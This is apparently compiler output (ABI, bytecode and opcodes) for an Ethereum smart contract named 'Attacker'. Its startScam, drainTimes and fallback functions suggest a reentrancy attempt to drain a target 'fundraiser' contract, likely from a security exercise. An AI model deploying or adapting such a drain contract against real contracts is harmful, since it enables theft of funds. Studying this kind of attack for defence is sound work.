{
	"": {
		"Attacker": {
			"abi": [
				{
					"constant": false,
					"inputs": [],
					"name": "getFunds",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"type": "function",
					"stateMutability": "nonpayable"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "fundraiserAddress",
					"outputs": [
						{
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"type": "function",
					"stateMutability": "view"
				},
				{
					"constant": false,
					"inputs": [
						{
							"name": "fundraiserAddress",
							"type": "address"
						}
					],
					"name": "payMe",
					"outputs": [],
					"payable": true,
					"type": "function",
					"stateMutability": "payable"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "drainTimes",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"type": "function",
					"stateMutability": "view"
				},
				{
					"constant": false,
					"inputs": [
						{
							"name": "fundraiserAddress",
							"type": "address"
						}
					],
					"name": "startScam",
					"outputs": [],
					"payable": true,
					"type": "function",
					"stateMutability": "payable"
				},
				{
					"payable": true,
					"type": "fallback",
					"stateMutability": "payable"
				}
			],
			"evm": {
				"bytecode": {
					"object": "6060604052600060015534610000575b6102168061001d6000396000f360606040523615610065576000357c0100000000000000000000000000000000000000000000000000000000900480634d9b37351461008c57806365687008146100af578063ad218d43146100e8578063c4f9a44414610100578063e27bdd8014610123575b61008a5b60036001541015610087576001600081548092919060010191905055505b5b565b005b346100005761009961013b565b6040518082815260200191505060405180910390f35b34610000576100bc61015b565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100fe6004808035906020019091905050610181565b005b346100005761010d6101a5565b6040518082815260200191505060405180910390f35b61013960048080359060200190919050506101ab565b005b60003073ffffffffffffffffffffffffffffffffffffffff163190505b90565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff1663d7bb99ba345050505b50565b60015481565b8073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b604051817c0100000000000000000000000000000000000000000000000000000000028152600401809050600060405180830381600087803b156100005760325a03f115610000575050505b5056",
					"opcodes": "PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x0 PUSH1 0x1 SSTORE CALLVALUE PUSH2 0x0 JUMPI JUMPDEST PUSH2 0x216 DUP1 PUSH2 0x1D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN PUSH1 0x60 PUSH1 0x40 MSTORE CALLDATASIZE ISZERO PUSH2 0x65 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV DUP1 PUSH4 0x4D9B3735 EQ PUSH2 0x8C JUMPI DUP1 PUSH4 0x65687008 EQ PUSH2 0xAF JUMPI DUP1 PUSH4 0xAD218D43 EQ PUSH2 0xE8 JUMPI DUP1 PUSH4 0xC4F9A444 EQ PUSH2 0x100 JUMPI DUP1 PUSH4 0xE27BDD80 EQ PUSH2 0x123 JUMPI JUMPDEST PUSH2 0x8A JUMPDEST PUSH1 0x3 PUSH1 0x1 SLOAD LT ISZERO PUSH2 0x87 JUMPI PUSH1 0x1 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP JUMPDEST JUMPDEST JUMP JUMPDEST STOP JUMPDEST CALLVALUE PUSH2 0x0 JUMPI PUSH2 0x99 PUSH2 0x13B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE PUSH2 0x0 JUMPI PUSH2 0xBC PUSH2 0x15B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xFE PUSH1 0x4 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP PUSH2 0x181 JUMP JUMPDEST STOP JUMPDEST CALLVALUE PUSH2 0x0 JUMPI PUSH2 0x10D PUSH2 0x1A5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x139 PUSH1 0x4 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP PUSH2 0x1AB JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE SWAP1 POP JUMPDEST SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD7BB99BA CALLVALUE POP POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO PUSH2 0x0 JUMPI PUSH1 0x32 GAS SUB CALL ISZERO PUSH2 0x0 JUMPI POP POP POP JUMPDEST POP JUMP ",
					"linkReferences": {}
				},
				"methodIdentifiers": {
					"drainTimes()": "c4f9a444",
					"fundraiserAddress()": "65687008",
					"getFunds()": "4d9b3735",
					"payMe(address)": "ad218d43",
					"startScam(address)": "e27bdd80"
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "106800",
						"executionCost": "5151"
					},
					"internal": {
						"()": "20173"
					},
					"external": {
						"": "20341",
						"drainTimes()": "20214",
						"fundraiserAddress()": "20214",
						"getFunds()": "20214",
						"payMe(address)": "20214",
						"startScam(address)": "infinite"
					}
				}
			}
		}
	}
}